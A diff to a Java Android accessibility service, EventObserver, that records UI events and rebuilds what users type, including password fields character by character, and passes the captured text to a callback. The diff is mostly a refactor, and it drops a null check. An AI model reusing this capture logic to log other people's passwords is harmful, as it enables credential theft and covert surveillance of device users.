@@ -14,18 +14,17 @@ import io.apisense.sting.phone.system.WindowChangeDetectingService;
  * Created by Mohammad Naseri
  */
 
-public class EventObserver extends WindowChangeDetectingService{
+public class EventObserver extends WindowChangeDetectingService {
     private static final String TAG = EventObserver.class.getName();
 
     private static OnAccessibilityEvent callback;
-    static Stack<StackElement> events = new Stack<>();
-    static StackElement lastEvent = null;
-    static String tempInput = "";
-    static AccessibilityEventWrapper tempWrapper;
+    private static Stack<StackElement> events = new Stack<>();
+    private static StackElement lastEvent = null;
+    private static String tempInput = "";
+    private static AccessibilityEventWrapper tempWrapper;
 
-    static String editTextClass = "android.widget.EditText";
-
-    static String widgetClass = "android.widget";
+    private static String EDIT_TEXT_CLASS = "android.widget.EditText";
+    private static String WIDGET_CLASS = "android.widget";
 
     @Override
     public void onServiceConnected() {
@@ -43,82 +42,78 @@ public class EventObserver extends WindowChangeDetectingService{
             if (events.size() > 0)
                 lastEvent = events.lastElement();
 
-            if (lastEvent != null) {
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED &&
+                    (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED))
+                            || (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED))
+                    ))) {
+                if (event.getText().size() != 0) {
+                    if (event.isPassword()) {
+                        tempInput += getLastCharacter(String.valueOf(event.getText().get(0)));
+                        tempWrapper = new AccessibilityEventWrapper(event, tempInput);
+                    } else {
+                        tempInput = String.valueOf(event.getText().get(0));
+                        tempWrapper = new AccessibilityEventWrapper(event, tempInput);
+                    }
+                }
+            }
 
-                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED &&
-                        (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED))
-                                || (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED))
-                        ))) {
-                    if (event.getText().size() != 0) {
-                        if (event.isPassword()) {
-                            tempInput += getLastCharacter(String.valueOf(event.getText().get(0)));
-                            tempWrapper = new AccessibilityEventWrapper(event, tempInput);
-                        } else {
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED &&
+                    (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED))
+                            || (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED))))) {
+
+                if (!tempInput.isEmpty()) {
+//                    Log.d(TAG, "onAccessibilityEvent: " + tempWrapper.toString());
+                    if (callback != null) {
+                        callback.sendData(tempWrapper);
+                    }
+                }
+
+                if (!event.isPassword()) {
+                    if (event.getClassName().equals(EDIT_TEXT_CLASS))
+                        if (!event.getText().isEmpty())
                             tempInput = String.valueOf(event.getText().get(0));
-                            tempWrapper = new AccessibilityEventWrapper(event, tempInput);
-                        }
-                    }
+                        else
+                            tempInput = "";
+                } else {
+                    tempInput = "";
                 }
 
-                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED &&
-                        (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED))
-                                || (lastEvent.eventType.equals(AccessibilityEvent.eventTypeToString(AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED))))) {
+            }
 
-                    if (!tempInput.equals("")) {
-                        Log.d(TAG, "onAccessibilityEvent: " + tempWrapper.toString());
-                        if (callback != null) {
-                            callback.sendData(tempWrapper);
-                        }
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                if (!tempInput.equals("")) {
+//                    Log.d(TAG, "onAccessibilityEvent: " + tempWrapper.toString());
+                    if (callback != null) {
+                        callback.sendData(tempWrapper);
                     }
-
-                    if (!event.isPassword()) {
-                        if (event.getClassName().equals(editTextClass))
-                            if (event.getText().size() != 0)
-                                tempInput = String.valueOf(event.getText().get(0));
-                            else
-                                tempInput = "";
-                    } else {
-                        tempInput = "";
-                    }
-
-                }
-
-                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-                    if (!tempInput.equals("")) {
-                        Log.d(TAG, "onAccessibilityEvent: " + tempWrapper.toString());
-                        if (callback != null) {
-                            callback.sendData(tempWrapper);
-                        }
-                        AccessibilityEventWrapper accessibilityEventWrapper = new AccessibilityEventWrapper(event, null);
-                        Log.d(TAG, "onAccessibilityEvent: " + accessibilityEventWrapper.toString());
-                        if (callback != null) {
-                            callback.sendData(accessibilityEventWrapper);
-                        }
-                        tempInput = "";
-                    }
-                }
-
-                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER && event.getText() != null) {
-                    if (event.getText().get(0).equals("delete")) {
-                        tempInput = removeLastChar(tempInput);
-                        tempWrapper = new AccessibilityEventWrapper(event, tempInput);
-                    } else {
-                        tempInput += String.valueOf(event.getText().get(0));
-                        tempWrapper = new AccessibilityEventWrapper(event, tempInput);
-                    }
-                }
-
-                if (event.getText().size() != 0 && event.getClassName() != null && tempInput == ""
-                        && !event.getClassName().toString().equals(editTextClass)
-                        && event.getClassName().toString().toLowerCase().contains(widgetClass.toLowerCase())) {
                     AccessibilityEventWrapper accessibilityEventWrapper = new AccessibilityEventWrapper(event, null);
-                    Log.d(TAG, "onAccessibilityEvent: " + accessibilityEventWrapper.toString());
+//                    Log.d(TAG, "onAccessibilityEvent: " + accessibilityEventWrapper.toString());
                     if (callback != null) {
                         callback.sendData(accessibilityEventWrapper);
                     }
                     tempInput = "";
                 }
+            }
 
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER && event.getText() != null) {
+                if (event.getText().get(0).equals("delete")) {
+                    tempInput = removeLastChar(tempInput);
+                    tempWrapper = new AccessibilityEventWrapper(event, tempInput);
+                } else {
+                    tempInput += String.valueOf(event.getText().get(0));
+                    tempWrapper = new AccessibilityEventWrapper(event, tempInput);
+                }
+            }
+
+            if (event.getText().size() != 0 && event.getClassName() != null && tempInput.isEmpty()
+                    && !event.getClassName().toString().equals(EDIT_TEXT_CLASS)
+                    && event.getClassName().toString().contains(WIDGET_CLASS)) {
+                AccessibilityEventWrapper accessibilityEventWrapper = new AccessibilityEventWrapper(event, null);
+//                Log.d(TAG, "onAccessibilityEvent: " + accessibilityEventWrapper.toString());
+                if (callback != null) {
+                    callback.sendData(accessibilityEventWrapper);
+                }
+                tempInput = "";
             }
 
 
@@ -163,13 +158,13 @@ public class EventObserver extends WindowChangeDetectingService{
     }
 
 
-    class StackElement {
-        public StackElement(String eventType, String eventPackage) {
+    static class StackElement {
+        StackElement(String eventType, String eventPackage) {
             this.eventType = eventType;
             this.eventPackage = eventPackage;
         }
 
-        public String eventType;
-        public String eventPackage;
+        public final String eventType;
+        public final String eventPackage;
     }
 }
